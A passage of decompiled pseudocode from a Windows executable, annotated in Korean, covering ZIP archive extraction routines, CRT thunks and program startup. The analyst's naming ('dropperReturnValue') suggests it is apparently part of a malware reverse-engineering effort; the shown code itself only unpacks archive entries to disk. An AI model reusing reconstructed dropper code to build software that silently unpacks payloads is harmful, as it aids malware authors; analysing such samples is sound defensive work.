  char *v18; // ecx
  char i; // al
  signed int v20; // eax
  signed int v21; // edi
  CHAR FileName[260]; // [esp+Ch] [ebp-338h] BYREF
  char Src[264]; // [esp+110h] [ebp-234h] BYREF
  DWORD dwFlagsAndAttributes; // [esp+218h] [ebp-12Ch]
  FILETIME LastAccessTime; // [esp+21Ch] [ebp-128h] BYREF
  FILETIME CreationTime; // [esp+224h] [ebp-120h] BYREF
  FILETIME LastWriteTime; // [esp+22Ch] [ebp-118h] BYREF
  char Destination[260]; // [esp+23Ch] [ebp-108h] BYREF
  DWORD NumberOfBytesWritten; // [esp+340h] [ebp-4h] BYREF

  v5 = mode;
  if ( mode != 3 )                              // 읽기 스트림 연결 
  {
    if ( mode == 2 || mode == 1 )               // 파일 추출 
    {
      if ( zipArc[1] != -1 )
        closeSession_406A97(*zipArc);
      v12 = *zipArc;
      v13 = hFile;
      zipArc[1] = -1;
      if ( v13 < v12[1] )
      {
        if ( v13 < v12[4] )
          initCentralZipIterator_4064E2(v12);
        while ( (*zipArc)[4] < v13 )
          MoveToNextZipEntry_406520(*zipArc);
        LoadZipEntryMetadata_406C40(zipArc, v13, Src);
        if ( (dwFlagsAndAttributes & 0x10) != 0 )
        {
          if ( v5 != 1 )
          {
            v14 = *Source;
            if ( *Source == 47 || v14 == 92 || v14 && Source[1] == 58 )
              mkdirRecursive_407070(0, Source);
            else
              mkdirRecursive_407070(zipArc + 320, Source);
          }
          return 0;
        }
        if ( v5 == 1 )
        {
          v15 = Source;
          goto LABEL_48;
        }
        v16 = Source;
        v17 = Source;
        v18 = Source;
        for ( i = *Source; i; i = *++v18 )
        {
          if ( i == 47 || i == 92 )
            v17 = v18 + 1;
        }
        strcpy(Destination, Source);
        if ( v17 == v16 )
        {
          Destination[0] = 0;
        }
        else
        {
          Destination[v17 - v16] = 0;
          if ( Destination[0] == 47 || Destination[0] == 92 || Destination[0] && Destination[1] == 58 )
          {
            wsprintfA(FileName, "%s%s", Destination, v17);
            mkdirRecursive_407070(0, Destination);
            goto LABEL_47;
          }
        }
        wsprintfA(FileName, "%s%s%s", zipArc + 320, Destination, v17);
        mkdirRecursive_407070(zipArc + 320, Destination);
LABEL_47:
        v15 = CreateFileA(FileName, 0x40000000u, 0, 0, 2u, dwFlagsAndAttributes, 0);
LABEL_48:
        hFile = v15;
        if ( v15 == -1 )
          return 512;
        initZipFileStream_40671D(*zipArc, zipArc[78]);
        if ( !zipArc[79] )
          zipArc[79] = operator new(0x4000u);
        output_size = 0;
        while ( 1 )
        {
          v20 = ReadFromZipStream_406880(*zipArc, zipArc[79], 0x4000u, &Source + 3);
          v21 = v20;
          if ( v20 == -106 )
          {
            output_size = 4096;
            goto LABEL_69;
          }
          if ( v20 < 0 )
          {
LABEL_66:
            output_size = 83886080;
            goto LABEL_69;
          }
          if ( v20 > 0 && !WriteFile(hFile, zipArc[79], v20, &NumberOfBytesWritten, 0) )
          {
            output_size = 1024;
            goto LABEL_69;
          }
          if ( HIBYTE(Source) )
            break;
          if ( !v21 )
            goto LABEL_66;
        }
        SetFileTime(hFile, &CreationTime, &LastAccessTime, &LastWriteTime);
LABEL_69:
        if ( mode != 1 )
          CloseHandle(hFile);
        closeSession_406A97(*zipArc);
        return output_size;
      }
    }
    return 0x10000;
  }
  v8 = zipArc[1];
  v9 = hFile;
  if ( hFile != v8 )
  {
    if ( v8 != -1 )
      closeSession_406A97(*zipArc);
    v10 = *zipArc;
    zipArc[1] = -1;
    if ( v9 >= v10[1] )
      return 0x10000;
    if ( v9 < v10[4] )
      initCentralZipIterator_4064E2(v10);
    while ( (*zipArc)[4] < v9 )
      MoveToNextZipEntry_406520(*zipArc);
    initZipFileStream_40671D(*zipArc, zipArc[78]);
    zipArc[1] = v9;
  }
  v11 = ReadFromZipStream_406880(*zipArc, Source, output_size, &hFile + 3);
  if ( v11 <= 0 )
  {
    closeSession_406A97(*zipArc);
    zipArc[1] = -1;
  }
  if ( HIBYTE(hFile) )
    return 0;
  if ( v11 <= 0 )
    result = v11 != -106 ? 83886080 : 4096;
  else
    result = 1536;
  return result;
}


// --- Metadata ---
// Function Name: ZipHandle_Release_40747B
// Address: 0x40747B
// Signature: unknown_signature
// ---------------
int __thiscall ZipHandle_Release_40747B(int *zipHandle)
{
  void *v2; // eax

  if ( zipHandle[1] != -1 )                     // ZIP 세션을 종료하고, 내부 구조체도 정리
    closeSession_406A97(*zipHandle);
  v2 = *zipHandle;
  zipHandle[1] = -1;
  if ( v2 )
    FreeZipArchive_406162(v2);
  *zipHandle = 0;
  return 0;
}


// --- Metadata ---
// Function Name: OpenZipArchive_4074A4
// Address: 0x4074A4
// Signature: unknown_signature
// ---------------
_DWORD *__cdecl OpenZipArchive_4074A4(HANDLE hFile, int a2, int a3, char *Str)
{
  _DWORD *rawContext; // ecx
  _DWORD *zipContext; // esi
  _DWORD *result; // eax

  rawContext = operator new(0x244u);
  if ( rawContext )
    zipContext = InitWithString_407527(rawContext, Str);// zip 컨텍스트와 리더를 생성한 후 핸들 반환 
  else
    zipContext = 0;
  dword_40F938 = InitZipFileReader_406B8E(zipContext, hFile, a2, a3);
  if ( dword_40F938 )
  {
    if ( zipContext )
    {
      ZipHandle_FreeBuffers_407572(zipContext);
      operator delete(zipContext);
    }
    result = 0;
  }
  else
  {
    result = operator new(8u);
    *result = 1;
    result[1] = zipContext;
  }
  return result;
}


// --- Metadata ---
// Function Name: InitWithString_407527
// Address: 0x407527
// Signature: unknown_signature
// ---------------
_DWORD *__thiscall InitWithString_407527(_DWORD *this, char *Str)
{
  size_t v3; // eax
  char *v4; // eax

  this[1] = -1;                                 // 일반적인 문자열 기반 객체 초기화
  this[77] = -1;
  *this = 0;
  this[78] = 0;
  this[79] = 0;
  if ( Str )
  {
    v3 = strlen(Str);
    v4 = operator new(v3 + 1);
    this[78] = v4;
    strcpy(v4, Str);
  }
  return this;
}


// --- Metadata ---
// Function Name: ZipHandle_FreeBuffers_407572
// Address: 0x407572
// Signature: unknown_signature
// ---------------
void __thiscall ZipHandle_FreeBuffers_407572(void **zipHandle)
{
  void **v2; // esi

  v2 = zipHandle + 78;                          // ZIP 처리 중 사용한 버퍼 메모리 2개를 정리
  if ( zipHandle[78] )
    operator delete(zipHandle[78]);
  *v2 = 0;
  if ( zipHandle[79] )
    operator delete(zipHandle[79]);
  zipHandle[79] = 0;
}


// --- Metadata ---
// Function Name: OpenZipArchiveWrapper_4075AD
// Address: 0x4075AD
// Signature: unknown_signature
// ---------------
_DWORD *__cdecl OpenZipArchiveWrapper_4075AD(HANDLE hFile, int a2, char *Str)
{
  return OpenZipArchive_4074A4(hFile, a2, 3, Str);
}


// --- Metadata ---
// Function Name: prepareZipEntry_4075C4
// Address: 0x4075C4
// Signature: unknown_signature
// ---------------
int __cdecl prepareZipEntry_4075C4(int struct_dropperReturnValue, int a2, void *Src)
{
  int result; // eax

  *Src = 0;                                     // 메타데이터를 특정 조건에 따라 구조체(Src)에 채워 넣는 기능
  *(Src + 4) = 0;
  *(Src + 74) = 0;
  if ( struct_dropperReturnValue )
  {
    if ( *struct_dropperReturnValue == 1 )
      result = LoadZipEntryMetadata_406C40(*(struct_dropperReturnValue + 4), a2, Src);
    else
      result = 0x80000;
  }
  else
  {
    result = 0x10000;
  }
  dword_40F938 = result;
  return result;
}


// --- Metadata ---
// Function Name: zipExtractWrapper_407603
// Address: 0x407603
// Signature: unknown_signature
// ---------------
int __cdecl zipExtractWrapper_407603(int a1, HANDLE hFile, char *Source, int a4, int a5)
{
  int result; // eax

  if ( a1 )
  {
    if ( *a1 == 1 )
      result = ZipArchive_ExtractEntry_407136(*(a1 + 4), hFile, Source, a4, a5);
    else
      result = 0x80000;
  }
  else
  {
    result = 0x10000;
  }
  dword_40F938 = result;
  return result;
}


// --- Metadata ---
// Function Name: zipExtract_40763D
// Address: 0x40763D
// Signature: unknown_signature
// ---------------
int __cdecl zipExtract_40763D(int a1, HANDLE hFile, char *Source)
{
  return zipExtractWrapper_407603(a1, hFile, Source, 0, 2);
}


// --- Metadata ---
// Function Name: ZipArchive_Close_407656
// Address: 0x407656
// Signature: unknown_signature
// ---------------
int __cdecl ZipArchive_Close_407656(void *zipHandle)
{
  int result; // eax
  int *v2; // esi

  if ( !zipHandle )                             // ZIP 핸들을 안전하게 닫고 메모리 해제하는 최종 해제 함수 
  {
    result = 0x10000;
LABEL_5:
    dword_40F938 = result;
    return result;
  }
  if ( *zipHandle != 1 )
  {
    result = 0x80000;
    goto LABEL_5;
  }
  v2 = *(zipHandle + 1);
  dword_40F938 = ZipHandle_Release_40747B(v2);
  if ( v2 )
  {
    ZipHandle_FreeBuffers_407572(v2);
    operator delete(v2);
  }
  operator delete(zipHandle);
  return dword_40F938;
}


// --- Metadata ---
// Function Name: strcpy
// Address: 0x4076A8
// Signature: unknown_signature
// ---------------
// attributes: thunk
char *__cdecl strcpy(char *Destination, const char *Source)
{
  return __imp_strcpy(Destination, Source);
}


// --- Metadata ---
// Function Name: memset
// Address: 0x4076AE
// Signature: unknown_signature
// ---------------
// attributes: thunk
void *__cdecl memset(void *a1, int Val, size_t Size)
{
  return __imp_memset(a1, Val, Size);
}


// --- Metadata ---
// Function Name: strlen
// Address: 0x4076B4
// Signature: unknown_signature
// ---------------
// attributes: thunk
size_t __cdecl strlen(const char *Str)
{
  return __imp_strlen(Str);
}


// --- Metadata ---
// Function Name: __CxxFrameHandler
// Address: 0x4076C0
// Signature: unknown_signature
// ---------------
// attributes: thunk
int _CxxFrameHandler()
{
  return __CxxFrameHandler();
}


// --- Metadata ---
// Function Name: __EH_prolog
// Address: 0x4076C8
// Signature: unknown_signature
// ---------------
void _EH_prolog()
{
  __asm { retn }
}


// --- Metadata ---
// Function Name: ??3@YAXPAX@Z
// Address: 0x4076E8
// Signature: unknown_signature
// ---------------
// attributes: thunk
void __cdecl operator delete(void *a1)
{
  __imp_??3@YAXPAX@Z(a1);
}


// --- Metadata ---
// Function Name: memcmp
// Address: 0x4076EE
// Signature: unknown_signature
// ---------------
// attributes: thunk
int __cdecl memcmp(const void *Buf1, const void *Buf2, size_t Size)
{
  return __imp_memcmp(Buf1, Buf2, Size);
}


// --- Metadata ---
// Function Name: _except_handler3
// Address: 0x4076F4
// Signature: unknown_signature
// ---------------
// attributes: thunk
int except_handler3()
{
  return _except_handler3();
}


// --- Metadata ---
// Function Name: _local_unwind2
// Address: 0x4076FA
// Signature: unknown_signature
// ---------------
// attributes: thunk
int __cdecl local_unwind2(int a1, int a2)
{
  return _local_unwind2(a1, a2);
}


// --- Metadata ---
// Function Name: ??2@YAPAXI@Z
// Address: 0x407700
// Signature: unknown_signature
// ---------------
// attributes: thunk
void *__cdecl operator new(unsigned int a1)
{
  return __imp_??2@YAPAXI@Z(a1);
}


// --- Metadata ---
// Function Name: memcpy
// Address: 0x407706
// Signature: unknown_signature
// ---------------
// attributes: thunk
void *__cdecl memcpy(void *a1, const void *Src, size_t Size)
{
  return __imp_memcpy(a1, Src, Size);
}


// --- Metadata ---
// Function Name: strcmp
// Address: 0x407740
// Signature: unknown_signature
// ---------------
// attributes: thunk
int __cdecl strcmp(const char *Str1, const char *Str2)
{
  return __imp_strcmp(Str1, Str2);
}


// --- Metadata ---
// Function Name: ??0exception@@QAE@ABV0@@Z
// Address: 0x407746
// Signature: unknown_signature
// ---------------
// attributes: thunk
exception *__thiscall exception::exception(exception *this, const struct exception *a2)
{
  return __imp_??0exception@@QAE@ABV0@@Z(this, a2);
}


// --- Metadata ---
// Function Name: ??_Gtype_info@@UAEPAXI@Z
// Address: 0x40774C
// Signature: unknown_signature
// ---------------
type_info *__thiscall type_info::`scalar deleting destructor'(type_info *this, char a2)
{
  type_info::~type_info(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}


// --- Metadata ---
// Function Name: ??1exception@@UAE@XZ
// Address: 0x407768
// Signature: unknown_signature
// ---------------
// attributes: thunk
void __thiscall exception::~exception(exception *this)
{
  __imp_??1exception@@UAE@XZ(this);
}


// --- Metadata ---
// Function Name: _CxxThrowException
// Address: 0x40776E
// Signature: unknown_signature
// ---------------
// attributes: thunk
void __stdcall __noreturn CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo)
{
  _CxxThrowException(pExceptionObject, pThrowInfo);
}


// --- Metadata ---
// Function Name: __allmul
// Address: 0x407780
// Signature: unknown_signature
// ---------------
__int64 __stdcall _allmul(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  if ( HIDWORD(a1) | HIDWORD(a2) )
    result = a1 * a2;
  else
    result = a2 * a1;
  return result;
}


// --- Metadata ---
// Function Name: strcat
// Address: 0x4077B4
// Signature: unknown_signature
// ---------------
// attributes: thunk
char *__cdecl strcat(char *Destination, const char *Source)
{
  return __imp_strcat(Destination, Source);
}


// --- Metadata ---
// Function Name: start
// Address: 0x4077BA
// Signature: unknown_signature
// ---------------
void __noreturn start()
{
  char *v0; // esi
  int v1; // eax
  HMODULE v2; // eax
  int v3; // [esp-4h] [ebp-88h]
  char v4[4]; // [esp+14h] [ebp-70h] BYREF
  int v5; // [esp+18h] [ebp-6Ch] BYREF
  int v6; // [esp+1Ch] [ebp-68h]
  char v7[4]; // [esp+20h] [ebp-64h] BYREF
  char v8[4]; // [esp+24h] [ebp-60h] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+28h] [ebp-5Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+6Ch] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  _set_app_type(_crt_gui_app);
  dword_40F94C = -1;
  dword_40F950 = -1;
  *_p__fmode() = dword_40F948;
  *_p__commode() = dword_40F944;
  dword_40F954 = adjust_fdiv;
  nullsub_1();
  if ( !dword_40F870 )
    _setusermatherr(UserMathErrorFunction);
  _setdefaultprecision();
  initterm(&First, &Last);
  v5 = dword_40F940;
  _getmainargs(v8, v4, v7, dword_40F93C, &v5);
  initterm(&dword_40E000, &dword_40E004);
  v0 = acmdln;
  if ( *acmdln != 34 )
  {
    while ( *v0 > 0x20u )
      ++v0;
    goto LABEL_8;
  }
  do
    ++v0;
  while ( *v0 && *v0 != 34 );
  if ( *v0 != 34 )
    goto LABEL_8;
  while ( 1 )
  {
    ++v0;
LABEL_8:
    if ( !*v0 || *v0 > 0x20u )
    {
      StartupInfo.dwFlags = 0;
      GetStartupInfoA(&StartupInfo);
      if ( (StartupInfo.dwFlags & 1) != 0 )
        v1 = StartupInfo.wShowWindow;
      else
        v1 = 10;
      v3 = v1;
      v2 = GetModuleHandleA(0);
      v6 = WinMain(v2, 0, v0, v3);
      exit(v6);
    }
  }
}


// --- Metadata ---
// Function Name: ??1type_info@@UAE@XZ
// Address: 0x407918
// Signature: unknown_signature
// ---------------
// attributes: thunk
void __thiscall type_info::~type_info(type_info *this)
{
  __imp_??1type_info@@UAE@XZ(this);
}


// --- Metadata ---
// Function Name: _XcptFilter
// Address: 0x40791E
// Signature: unknown_signature
// ---------------
// attributes: thunk
int XcptFilter()
{
  return _XcptFilter();
}


// --- Metadata ---
// Function Name: _initterm
// Address: 0x407924
// Signature: unknown_signature
// ---------------
// attributes: thunk
void __cdecl initterm(_PVFV *First, _PVFV *Last)
{
  _initterm(First, Last);
}


// --- Metadata ---
// Function Name: __setdefaultprecision
// Address: 0x40792A
// Signature: unknown_signature
// ---------------
unsigned int _setdefaultprecision()
{
  return controlfp(0x10000u, 0x30000u);
}


// --- Metadata ---
// Function Name: UserMathErrorFunction
// Address: 0x40793C
// Signature: unknown_signature
// ---------------
int __cdecl UserMathErrorFunction()
{
  return 0;
}


// --- Metadata ---
// Function Name: nullsub_1
// Address: 0x40793F
// Signature: unknown_signature
// ---------------
void nullsub_1()
{
  ;
}


// --- Metadata ---
// Function Name: _controlfp
// Address: 0x407940
// Signature: unknown_signature
// ---------------
// attributes: thunk
unsigned int __cdecl controlfp(unsigned int NewValue, unsigned int Mask)
{
  return _controlfp(NewValue, Mask);
}


